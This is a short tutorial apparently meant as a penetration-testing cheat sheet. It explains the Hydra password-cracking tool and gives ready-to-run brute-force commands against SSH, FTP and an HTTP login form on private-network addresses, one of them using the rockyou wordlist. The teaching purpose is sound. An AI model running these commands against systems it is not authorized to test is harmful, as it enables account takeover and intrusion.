Hydra

What is Hydra?

Hydra is a fast and flexible password-cracking tool that supports a wide range of protocols including FTP, SSH, Telnet, HTTP, HTTPS, SMB, and more. It is primarily used to perform dictionary-based brute-force attacks on login credentials.

Basic Usage

Brute-force an SSH login with a username and a password list:

hydra -l root -P /usr/share/wordlists/rockyou.txt ssh://192.168.1.10

Brute-force an HTTP login form:

hydra -L users.txt -P passwords.txt 192.168.1.10 http-post-form "/login.php:user=^USER^&pass=^PASS^:F=incorrect"

Brute-force FTP service with multiple usernames and passwords:

hydra -L users.txt -P passwords.txt ftp://192.168.1.10

Practical Example

Attempt to crack SSH on a local target using common usernames and passwords:

hydra -L common_users.txt -P top_passwords.txt ssh://192.168.1.5

This approach is useful in penetration testing scenarios where weak login credentials may be in use.
